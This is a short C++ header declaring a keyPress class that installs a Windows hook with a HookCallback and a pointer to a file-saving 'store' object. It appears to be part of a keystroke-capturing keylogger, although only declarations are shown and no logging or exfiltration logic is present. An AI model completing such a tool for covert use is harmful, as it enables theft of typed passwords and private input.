/*
 * keyPress.h
 *
 *  Created on: Dec 7, 2017
 *      Author: julio.andrade
 */

#ifndef KEYPRESS_KEYPRESS_H_
#define KEYPRESS_KEYPRESS_H_
#include "..\FileSave\store.h"


#include <Windows.h>

class keyPress {

private:
	static store *saveFile;
	static HHOOK _hook;

public:


	static void Start();
	static void unlock();

	static LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
};




#endif /* KEYPRESS_KEYPRESS_H_ */
